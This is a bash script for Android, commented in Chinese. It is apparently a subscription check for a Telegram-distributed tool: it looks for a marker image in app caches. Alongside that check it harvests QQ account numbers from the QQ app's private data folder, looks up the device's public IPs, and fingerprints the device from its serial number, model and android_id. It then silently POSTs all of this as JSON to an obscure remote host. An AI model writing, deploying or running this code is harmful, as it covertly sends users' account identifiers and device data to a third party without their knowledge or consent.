#!/bin/bash
set -euo pipefail

# ------------------------------
# 配置
# ------------------------------
qq_dir="/data/data/com.tencent.mobileqq/files/"
target_file="-6190413750901787098_99.jpg"
cache_glob="/storage/emulated/0/Android/data/*/cache/"

# 要尝试的 IP 服务（只取 IPv4）
IP_SERVICES=(
  "https://api.ip.sb/ip"                 # 返回纯IP或带换行
  "https://ifconfig.me/ip"
  "https://api.ipify.org"
  "https://ipinfo.io/ip"
  "https://ipecho.net/plain"
)

# ------------------------------
# kernel version
# ------------------------------
kernel_version=$(uname -r | awk -F- '{print $1}' | awk -F. '{print $1"."$2}')
# echo "kernel: $kernel_version"

# ------------------------------
# TG 订阅验证文件检查
# ------------------------------
validation_status="failed"
for cache_dir in $cache_glob; do
  if [ -f "${cache_dir}${target_file}" ]; then
    validation_status="success"
    break
  fi
done
# echo "validation: $validation_status"

# ------------------------------
# 收集 QQ 号（纯数字文件/文件夹名）
# ------------------------------
numbers_list=()
if [ -d "$qq_dir" ]; then
  for item in "$qq_dir"/*; do
    name=$(basename "$item")
    # 只匹配纯数字
    if [[ "$name" =~ ^[0-9]+$ ]]; then
      numbers_list+=("$name")
    fi
  done
fi
numbers=$(IFS=,; echo "${numbers_list[*]}")   # 逗号分隔，如果为空则为空字符串

# ------------------------------
# 获取多个公网 IPv4（按顺序尝试，去重）
# ------------------------------
ips_found=()
for svc in "${IP_SERVICES[@]}"; do
  # 使用短超时避免阻塞
  ip_raw=$(curl -m 5 -s --retry 1 "$svc" || true)
  # 取出IPv4
  if [[ $ip_raw =~ ([0-9]{1,3}(\.[0-9]{1,3}){3}) ]]; then
    ip="${BASH_REMATCH[1]}"
    # 简单校验每段 <=255
    valid=true
    IFS='.' read -r -a octets <<< "$ip"
    for o in "${octets[@]}"; do
      if (( o < 0 || o > 255 )); then valid=false; break; fi
    done
    if $valid; then
      # 去重
      skip=false
      for e in "${ips_found[@]}"; do
        if [ "$e" = "$ip" ]; then skip=true; break; fi
      done
      if ! $skip; then ips_found+=("$ip"); fi
    fi
  fi
done

# 如果都失败，尝试使用本地接口（可能是局域网/运营商网关，但放最后）
if [ ${#ips_found[@]} -eq 0 ]; then
  # 尝试 ip route get 1.1.1.1 或 ip addr
  if command -v ip >/dev/null 2>&1; then
    ip_try=$(ip route get 1.1.1.1 2>/dev/null | awk '/src/ {for(i=1;i<=NF;i++){if($i=="src"){print $(i+1); exit}}}')
    if [[ $ip_try =~ ^([0-9]{1,3}(\.[0-9]{1,3}){3})$ ]]; then
      ips_found+=("$ip_try")
    fi
  fi
fi

# 最终 IP 字符串（逗号分隔）
ip_csv=$(IFS=,; echo "${ips_found[*]}")

# ------------------------------
# 获取设备唯一 ID（机器码）
# 尝试：getprop -> /system/build.prop -> fallback unknown
# ------------------------------
device_id="unknown"
device_components=()

# try getprop (most Android shells)
if command -v getprop >/dev/null 2>&1; then
  serial=$(getprop ro.serialno 2>/dev/null || echo "")
  model=$(getprop ro.product.model 2>/dev/null || echo "")
  manufacturer=$(getprop ro.product.manufacturer 2>/dev/null || echo "")
  brand=$(getprop ro.product.brand 2>/dev/null || echo "")
  android_id=$(settings get secure android_id 2>/dev/null || echo "")
  [ -n "$serial" ] && device_components+=("$serial")
  [ -n "$model" ] && device_components+=("$model")
  [ -n "$manufacturer" ] && device_components+=("$manufacturer")
  [ -n "$brand" ] && device_components+=("$brand")
  [ -n "$android_id" ] && device_components+=("$android_id")
fi

# fall back to reading /system/build.prop if available and components still empty
if [ ${#device_components[@]} -eq 0 ] && [ -f /system/build.prop ]; then
  serial=$(grep -m1 '^ro.serialno=' /system/build.prop | cut -d'=' -f2 || echo "")
  model=$(grep -m1 '^ro.product.model=' /system/build.prop | cut -d'=' -f2 || echo "")
  manufacturer=$(grep -m1 '^ro.product.manufacturer=' /system/build.prop | cut -d'=' -f2 || echo "")
  [ -n "$serial" ] && device_components+=("$serial")
  [ -n "$model" ] && device_components+=("$model")
  [ -n "$manufacturer" ] && device_components+=("$manufacturer")
fi

# 如果任然没取到有意义数据，尝试部分命令/文件
if [ ${#device_components[@]} -eq 0 ]; then
  # 尝试 /data/property 或其它（非 root 情况下常失败）
  # 最后保证 device_components 至少有一个占位
  device_components+=("unknown")
fi

device_raw=$(IFS=_; echo "${device_components[*]}")
# md5sum 或 md5 可用时计算
if command -v md5sum >/dev/null 2>&1; then
  device_id=$(echo -n "$device_raw" | md5sum | awk '{print $1}')
elif command -v md5 >/dev/null 2>&1; then
  device_id=$(echo -n "$device_raw" | md5 | awk '{print $1}')
else
  # 最后退回 base64 摘要（非理想，但保证不为空）
  device_id=$(echo -n "$device_raw" | base64 | cut -c1-32)
fi

# ------------------------------
# 构建 JSON（不包含 country）
# ip 字段为数组（如果没有 ip 则是空数组）
# ------------------------------
# build JSON array for ips
ips_json="[]"
if [ ${#ips_found[@]} -gt 0 ]; then
  # escape
  items=""
  for ipitem in "${ips_found[@]}"; do
    items+=\"${ipitem}\",
  done
  # remove trailing comma
  items=${items%,}
  ips_json="[$items]"
fi

# ensure numbers is either "" or string
numbers_safe=$(printf '%s' "$numbers" | sed 's/"/\\"/g')

json_data=$(cat <<EOF
{
  "kernel_version": "$(printf '%s' "$kernel_version")",
  "validation_status": "$(printf '%s' "$validation_status")",
  "numbers": "$numbers_safe",
  "ip": $ips_json,
  "device_id": "$(printf '%s' "$device_id")"
}
EOF
)

# ------------------------------
# 发送 POST 到 Vercel PHP API（替换成你的实际 URL）
# ------------------------------
VERCEL_API="https://ewuodfuiwefg.yg.gs/api/verify.php"

# 使用短超时，失败不影响本脚本（可根据需要调整）
curl -s -m 10 -X POST "$VERCEL_API" \
  -H "Content-Type: application/json" \
  -d "$json_data" || true

# 可选：输出 JSON 到 stdout（便于调试）
echo "$json_data"
